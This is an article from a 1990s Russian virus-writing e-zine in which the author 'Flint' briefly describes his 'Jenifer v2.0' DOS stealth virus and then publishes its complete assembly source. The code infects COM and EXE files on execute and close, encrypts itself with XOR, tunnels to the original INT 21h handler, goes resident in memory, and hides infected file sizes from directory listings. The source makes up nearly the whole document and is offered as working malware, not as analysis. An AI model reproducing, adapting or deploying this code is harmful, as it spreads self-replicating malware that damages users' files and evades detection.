comment {

[Death Virii Crew] Presents
CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997


				Jenifer.


 Привет всем, кто читает этот маленький бред!
 Вот думаю раскажу про собственную вирю.

 Этот stealth вирус заражает com и exe файлы.
 COM записывает начало файла в конец шифруя, потом пишет себя в начало
 и тоже шифруясь
 EXE если нет оверлея то записывается в конец (шифруясь)

 Заражает файл независимо от атрибутов.
 Ищет натурный вход в 21 int. трассируя.
 Заражает на EXEC и CLOSE
 А также использует не прямой вызов 21 прерывания, через 2A

 Есть защита от WEB-а.
 Если В ячейке таймера [40h:6dh]=07dah то выводит на екран сообщение.
 Jenifer v2.0 stealth virus
 Сигнатура заражения:
                    время последний байт xor 51h если совпадет с
                    последним байтом даты значит заражен.

                                                       (c) Flint
{
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
.286
VSize		equ	Vend-Starts
ShifrS		equ	(ShifrEnd-ShifrBeg)
GetSize 	equ	     word ptr es:[bp+17]
Vecs		equ	2ah
true		equ	1
false		equ	0
SFlag		equ	mov  byte ptr cs:flag,true
CFlag		equ	mov  byte ptr cs:flag,False

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Sign		equ	Word ptr ds:[Vend+Vsize]
PartPag 	equ	Word ptr ds:[Vend+Vsize+02]
PageCnt         equ     Word ptr ds:[Vend+Vsize+04]
ReloCnt 	equ	Word ptr ds:[Vend+Vsize+06]
HdrSize 	equ	Word ptr ds:[Vend+Vsize+08]
MinMem		equ	Word ptr ds:[Vend+Vsize+10]
MaxMem		equ	Word ptr ds:[Vend+Vsize+12]
ReloSS		equ	Word ptr ds:[Vend+Vsize+14]
ExeSP		equ	Word ptr ds:[Vend+Vsize+16]
ChkSum		equ	Word ptr ds:[Vend+Vsize+18]
ExeIP		equ	Word ptr ds:[Vend+Vsize+20]
ReloCS		equ	Word ptr ds:[Vend+Vsize+22]
TablOff 	equ	Word ptr ds:[Vend+Vsize+24]
Overlay 	equ	Word ptr ds:[Vend+Vsize+26]
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

RegMov		macro	Reg1,Reg2
		 push	 Reg1
		 pop	 Reg2
		EndM
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
CSeg		SEGMENT
		assume	CS:CSeg;DS:CSeg;ES:CSeg
		org	100h

Starts: 	 mov	 bp,0000		   ; Offset will be ussed
Maps	equ $-2
		lea	di,ShifrBeg
		mov	ax,[bp+offset(Cod)]
		mov	cx,ShifrS
calc_:		xor	cs:[di+bp],al
		inc	di
		mov	word ptr es:[0feh],ax
		mov	ax,es
		mov	ax,word ptr es:[0feh]
		loop	 calc_
ha:             jmp     start
Cod		dw	0
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
ShifrBeg:
Int21exec:	pushf
		SFlag
		cmp	ah,3Eh			 ; Is it Close File ?
		je	Infect3Eh		 ; Jump at Infect.
		cmp	ah,4bh
                je      Infect4Bh
		jmp	CheckDec
Original:	popf
		CFlag
		jmp	DWord Ptr Orig21	 ; Jump Original int 21h.
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Infect3Eh:
		pusha
		push	es ds
		mov	cs:Handle,bx
                call    Fcb_ob_bx
		jc	Out3e
		call	Test_Ext
		jz	Go_3
Out3e:		jmp	CloseFWt
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Infect4Bh:
		pusha
		push	es ds
		call	ShowMess
		call	Swap24h
		call	CheckName
		Jc	Go_1
		mov	ax,3d00h
		call	Int21O			    ; Open file <<name>>.
		jnc	Go_2
Go_1:		jmp	Exit
Go_2:		mov	cs:handle,ax
                call    Fcb_ob_Bx
Go_3:		mov	byte ptr es:[di+2],02	    ; Now we can write to file
		mov	bx,cs:Handle
		mov	ax,5700h
		call	Int21O
		xor	cl,51h
		cmp	cl,dl
		jne	NotInfected
		jmp	Exit
NotInfected:	RegMov	cs,ds
		call	GetRnd2Ax
		mov	word ptr cs:Cod,ax
		call	Seekat0 		    ; Seek at begin.
		lea	dx,Sign
		mov	cx,1ch
		call	Readh			    ; Read header in buf.
		cmp	Sign,4d5ah
		je	EXeW
		cmp	Sign,5a4dh		    ;Is this file Exe?
EXeW:		je	CopyToEXE
		jmp	CopyToCom
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
CopyToEXE:					    ; ES pointer at FCB
		mov	ax,ReloCs		    ; Need for GetSize
		mov	CS_,ax			    ; And seek at smth
		mov	ax,ExeIp
		mov	Ip_,ax
		mov	Sign,4d5ah
                mov     ax,PageCnt
		dec	ax
		mov	cx,200h
		mul	cx
		add	ax,PartPag
		cmp	ax,GetSize
		jne	ClosefWT
		cmp	dx,GetSize+2
		jne	ClosefWT
		push	ax dx
		mov	cx,10h
		div	cx
		sub	ax,HdrSize
		sbb	dx,0
		mov	cx,ax
		mov	word ptr cs:Maps,dx
		add	dx,100h
		mov	ExeIp,dx
		sub	cx,10h
		mov	ReloCs,cx
		pop	dx ax
		add	ax,VSize
		mov	cx,200h
		div	cx
		inc	ax
                mov     PageCnt,ax
		mov	PartPag,dx
		add	ReloSS,(Vsize shr 4)+1
		call	Seekat0 		    ;Seek on begin
		lea	dx,Sign
		mov	cx,1Ch			    ;Write head to file
		call	Writeh
		call	SeekAtEnd
		call	CopyMem
		mov	di,offset(ShifrBeg)+Vsize
		call	Shifr			    ;Shifr data
		lea	dx,Vend
		call	WriteF			    ;Write to end of file

Closef:
		push	dx cx
		mov	ax,5700h
		Call	Int21O
		mov	ax,5701h
		mov	cl,dl
		xor	cl,51h
		Call	Int21O
		pop	cx dx
ClosefWT:	mov	ah,3Eh			    ;Close file
		mov	bx,cs:Handle
		Call	Int21O
		jmp	exit
Pclosef:	pop	cx
		jmp	short ClosefWT

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

CopyToCOM:	cmp	GetSize+2,1
		ja	Yeah
		cmp	GetSize,Vsize
		ja	Yeah
		jmp	exit
Yeah:		call	Seekat0
		lea	dx,Vend
		call	Readf			    ;Read file at Vend
		mov	di,dx
		mov	cx,Vsize
		mov	ax,Cod
Loop_Cycl:	xor	byte ptr cs:[di],al	    ; Code it
		inc	di
		loop	Loop_Cycl
		mov	word ptr cs:[Maps],0
		call	SeekAtEnd
		mov	Seek,ax 		    ;Seek at end of file
		mov	SenSeek,dx
		lea	dx,Vend
		call	Writef			    ;Write begin of file at End
		call	Seekat0 		    ; Seek at 0
		call	CopyMem
		mov	di,offset(ShifrBeg)+Vsize
		call	Shifr			    ;Shifr data
		lea	dx,Vend
		call	Writef			    ;Write Virus at end
		jmp	Closef

Exit:		call	Swap24h
		pop	ds es
		popa
		cmp	ah,3eh
		je	Go3e
Exit21Exec:	jmp	original
Go3e:		CFlag
		int	2Ah
		add	sp,2
		retf	2
;============================================================================
Start:
		push	es ds cs
		pop	ds
		pusha
						    ; Store CS:IP of Return
		push	es			    ; Exe File
		pop	bx
		add	bx,10h
		add	word ptr cs:[Cs_+bp],bx

		mov	ax,[offset(Seek)+bp]
		mov	[offset(Aseek)+bp],ax
		mov	dx,[offset(SenSeek)+bp]
		mov	[offset(SenASeek)+bp],dx
		mov	word ptr cs:[corr+bp],bp

		push	es
		mov	ax,352ah
		int	21h			    ; Am I in the Memory ?
		mov	[bp+int2a+2],es
		mov	[bp+int2a],bx
                cmp     bx,offset(Int2ahand)
                jne     Contr
                jmp     runpr                       ; Yes I am. Run Program
Contr:          mov     ah,34h
		int	21h
		mov	word ptr [bp+Seg21h],es
		pop	es

                push    cs
		pop	ax
		mov	bx,es:[2]
		sub	bx,ax
		sub	bx,((Vsize SHR 4)+5)*2

		pushf
		push	es ds ax bx dx


		mov	ax,3521h
		int	21h
		mov	cs:[bp+cs21],es
		mov	cs:[bp+ip21],bx

		mov	ax,3501h
		int	21h
		push	bx es
                lea     dx,Trace21h
		add	dx,bp
		mov	ah,25h
		int	21h
		 pushf
		 pop	ax
		 or	 ah,1
		 push	 ax
		 popf
		mov	ah,58h
		mov	bx,2
		pushf
		call	dword ptr [bp+Orig21]
		pop	ds
		pop	dx
		mov	ax,2501h
		int	21h
		pop	dx bx ax ds es
		popf
						    ; Change Size of Current
						    ; block Size=
		mov	ah,4Ah			    ; = Size-(Vsize SHR 4)+1
		int	21h
		mov	ah,48h
		mov	bx,((Vsize SHR 4)+4)*2
		int	21h			    ; Alloc memory (Vsize SHR 4)+1
		jc	Runpr
		mov	dx,ax
		push	ax			    ; Delete Owner
		 dec	 ax
		 push	 ax
		 pop	 es
		cld
		mov	ax,word ptr [bp+Seg21h]
		mov	es:[0001],ax		    ; Owner = ax
		mov	di,5
                lea     si,Sgnum+3
		add	si,bp
		mov	cx,7
		rep	movsb
		pop	ax

		mov	di,100h
		mov	si,di
		add	si,bp
		sub	ax,10h
		push	ax
		pop	es
		mov	cx,Vsize
      rep	movsb
		mov	es:cs24,es
		push	ds ds es
		pop	ds
		cli
		xor	ax,ax			      ;Save and Set int 2A
		mov	es,ax
                mov     es:[Vecs*4],offset(Int2AHand)
		mov	es:[Vecs*4+2],ds
		RegMov	ds,es
		mov	si,cs:[Oip21+bp]
		mov	ds,cs:[Ocs21+bp]
		mov	cx,5
		cld
		lea	di,Fivebytes
		rep movsb
		pop	es ds
		sti
		int	2ah
Runpr:						    ; Run Program
		popa
		pop	ds es
		push	cs
		push	ds
		pop	ax
		pop	bx
		cmp	ax,bx
		je	end_com 		    ; It is Com File

		jmp	DWord Ptr cs:[ip_+bp]

End_Com:	mov	di,Seek
		add	di,100h
		call	DEShifr
		mov	di,100h
		mov	si,ASeek
		add	si,100h
		push	100h
		jmp	$+2
		rep	movsb			    ; Copy Program at 100h
		ret				    ; Run program
;===============================================================================
Int21h: 	pushf
		push	ds es di si cx
		mov	es,cs:Ocs21
		mov	di,cs:Oip21
		RegMov	cs,ds
		lea	si,Fivebytes
		mov	cx,5
		cld
		rep	movsb
		pop	cx si di es ds
		popf
		jmp	Int21Exec

;===============================================================================
Int2AHand:      pushf
		cmp	byte ptr cs:flag,true
		je	Out2a
		push	ax di es
		mov	es,cs:Ocs21
		mov	di,cs:Oip21
		mov	byte ptr es:[di],0EAh			 ;  Jump Far
		mov	word ptr es:[di+1],offset(Int21h)	 ;  IP
		mov	word ptr es:[di+3],cs			 ;  CS
		pop	es di ax
Out2a:		popf
		db	0EAh
Int2A  label  word
		dd	?
;===============================================================================
CheckName:	push   es ds cs
		pop    ds
		pop    es
		lea    si,Ext
		mov    cx,79
		cld
		mov    al,'.'
		mov    di,dx
		repne  scasb
		jne    NoInfect
		sub    di,3
		mov    cl,15
     NextExt:	cmpsw
		jz     pass
		inc    di
		loop   NextExt
NoInfect:	clc
     TTT:	pop    es
		ret
     pass:	stc
		jmp    short  TTT
Ext	       db      'NFEBSTANRJIPHAARND'
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
GetRnd2Ax:	push	es
		mov	ax,40h
		mov	es,ax
		mov	ax,es:[6Ch]
		pop	es
		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
CheckDec:	Sflag
		cmp	ah,4eh			 ; Is It FF go at DecSize.
		 je	 CheckSize4
		cmp	ah,4fh			 ; Is It FN go at DecSize.
		 je	 CheckSize4
		cmp	ah,11h
		 je	 CheckSize1
		cmp	ah,12h
		 je	 CheckSize1
		jmp	original
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
CheckSize1:	popf
		push	bx es
		Call	OrigFunc
		pushf
		push	ax
		cmp	byte ptr es:[bx],0ffh
		jne	Extend
		add	bx,7h
Extend: 	add	bx,17h
		call	ChkTime
		jne	_Reti
		add	bx,6h
		call	DecSize
_Reti:		pop	ax
		popf
		pop	es
		pop	bx
		CFlag
		retf	2
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
CheckSize4:	popf
		push	bx es
		Call	OrigFunc
		pushf
		push	ax
		add	bx,16h
		call	ChkTime
		jne	_Reti
		add	bx,4h
		call	DecSize
		jmp	short _RetI
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
ChkTime:
		mov	al,es:[bx]
		xor	al,51h
		cmp	al,es:[bx+2]
		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
DecSize:	sub	word ptr es:[bx],Vsize
		sbb	word ptr es:[bx+2],0
		jnc	OutDec
		add	word ptr es:[bx],Vsize
		adc	word ptr es:[bx+2],0
OutDec: 	ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Test_Ext:	push	cs
		pop	ds
		push	di
		add	di,28h
		cld
                lea     si,Sgnum
		mov	cx,3
		rep	cmpsb			     ; Is it COM file ?
		pop	di
		jz	Cont
		push	di
		add	di,28h
                lea     si,Sgnum+3
		mov	cl,3
		rep	cmpsb			     ; Is it Exe file ?
		pop	di
		jz	Cont
Cont:		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Fcb_ob_Bx:
		mov	bx,cs:handle
		mov	ax,1220h
		int	2fh
		xor	bx,bx
		mov	bl,ds:[di]
		mov	ax,1216h
		int	2fh
		mov	bp,di
		ret

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
ShowMess:	push	es
		mov	ax,40h
		mov	es,ax
		cmp	word ptr es:[6dh],7dah
		jne	OutMess
		mov	ax,0b800h
		mov	es,ax
		mov	si,22h
		lea	di,VirMess
		mov	ah,1eh
cont5:		mov	al,byte ptr cs:[di]
		mov	word ptr es:[si],ax
		inc	di
		add	si,2
		cmp	al,0
		jne	cont5
		mov	cx,20
		mov	ah,86h
		int	15h
OutMess:	pop	es
		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Swap24h:	push	es
		xor	ax,ax
		mov	es,ax
		cli
		mov	ax,es:[24h*4]
		xchg	ax,cs:Ip24
		mov	es:[24h*4],ax

		mov	ax,es:[24h*4+2]
		xchg	ax,cs:cs24
		mov	es:[24h*4+2],ax
		sti
		pop	es
		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Int24h: 	mov	al,3			  ;  Handler of int 24h
		iret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
OrigFunc:	call	Int21O
		jc	fo
		mov	ah,2fh
		call	Int21O			  ; Dta
fo:		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Shifr:		mov	ax,Cod			  ; Coding virus.
		mov	cx,ShifrS
Code_go:	xor	cs:[di],al
		inc	di
		loop	code_go
		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Int21O: 	pushf				  ; Call Original 21h.
		Call	Dword ptr cs:Orig21h
		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
CopyMem:	push	es
		push	cs
		pop	es
		mov	cx,Vsize		  ; Copy Body to Vend.
		mov	si,100h
		lea	di,Vend
      rep	movsb
		pop	es
		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
SeekAtEnd:					  ; Seek FP at End.
		mov	ax,GetSize
		mov	dx,Getsize+2
SeekAtAxDx:	mov	word ptr es:[bp+21],ax
		mov	word ptr es:[bp+23],dx
		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
SeekAt0:	mov  word ptr es:[bp+21],0
		mov  word ptr es:[bp+23],0
		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
ReadF:		mov	cx,Vsize		  ; Read File.
Readh:		 mov	 ah,3fh 		  ; Read Header.
		mov	bx,Handle
		Call	Int21O
		jnc	rcont
		jmp	PClosef
rcont:		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
WriteF: 	mov	cx,Vsize		  ; Write File.
Writeh: 	 mov	 ah,40h 		  ; Write Header to file.
		mov	bx,handle
		Call	Int21O
		jnc	wcont
		jmp	PClosef
wcont:		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

DeShifr:	mov	cx,Vsize
		push	cx
		mov	ax,Cod
LoopCycl:	xor	byte ptr [di],al
		inc	di
		loop	LoopCycl
		pop	cx
		ret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Orig21: 					 ; Original IP & CS of int 21h
ip21		dw	109Eh
cs21		dw	0123h
Orig21h:
Oip21		dw	109Eh
Ocs21		dw	0123h
ip24		dw	Offset Int24H
cs24		dw	?
flag		db	false

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Trace21h:       push   bp
		mov    bp,sp
		cmp    word ptr [bp+4],0B5Fh
Seg21h equ $-2
		jne    ExitTrace
		push   ax bx ds
		lds    ax,[bp+2]
		mov    bx,0000h
  Corr	equ $-2
		mov    cs:[bx+Oip21],ax
		mov    cs:[bx+Ocs21],ds
		pop    ds bx ax
		and    byte ptr [bp+07],0feh
ExitTrace:	pop    bp
		iret
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Sgnum           db      'EXECOMMAND'
Aseek		dw	?
SenASeek	dw	?
Seek		dw	(Vend-100h)
SenSeek 	dw	0
IP_		dw	0			; IP of return.
Cs_		dw	0			; CS of return.
Handle		dw	?
VirMess         db      '    Jenifer v2.0 stealth virus. ',??date,'    ',0
FiveBytes	db	5 dup(?)
ShifrEnd:
vend:

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
;			    User's  Program
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Prog:
		mov	ah,09
		lea	dx,mess
		int	21h
		ret
mess            db      'Stealth Virus was writen at ',??date,' by Flint ',0dh,0ah
		db	'It infects files with extension COM & EXE',0dh,0ah
		db	'It stays in memory, catches int 21h',0dh,0ah
		db	'    function  4Bh 3Eh 11h 12h 4eh 4fh '
		db	'and codes itself. ',0dh,0ah,'$'
CSeg	ENDS
	end	starts
